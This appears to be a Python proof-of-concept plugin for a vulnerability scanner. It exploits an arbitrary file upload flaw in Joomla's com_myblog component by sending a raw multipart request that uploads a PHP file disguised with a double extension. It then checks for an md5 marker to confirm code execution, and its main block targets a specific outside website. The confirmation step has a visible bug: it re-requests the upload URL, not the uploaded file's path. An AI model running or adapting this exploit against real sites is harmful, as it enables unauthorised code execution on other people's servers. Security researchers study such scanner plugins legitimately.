#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref https://www.youtube.com/watch?v=Rk6di9REaM8

import random
import re
def assign(service, arg):
    if service == "joomla":
        return True, arg


def audit(arg):
    raw = '''POST /index.php?option=com_myblog&task=ajaxupload HTTP/1.1
Host: www.baidu.com
Accept: */*
Content-Length: 235
Content-Type: multipart/form-data; boundary=------------------------672e7d0b915bbd1b

--------------------------672e7d0b915bbd1b
Content-Disposition: form-data; name="fileToUpload"; filename="shell.php.xxxjpg"
Content-Type: application/octet-stream

<?php echo md5(0x22);unlink(__FILE__);?>
--------------------------672e7d0b915bbd1b'''
    url = arg + '/index.php?option=com_myblog&task=ajaxupload'
    code, head,res, errcode, _ = curl.curl2(url, raw=raw)

    if 'shell.php.xxxjpg' in res:
        shell = re.findall(r"source: '(.+)'", res)
        if shell:
            code, head,res, errcode, _ = curl.curl2(url)
            if 'e369853df766fa44e1ed0ff613f563bd' in res:
                security_hole(shell[0])
                
if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla','http://turbiruem.ru/')[1])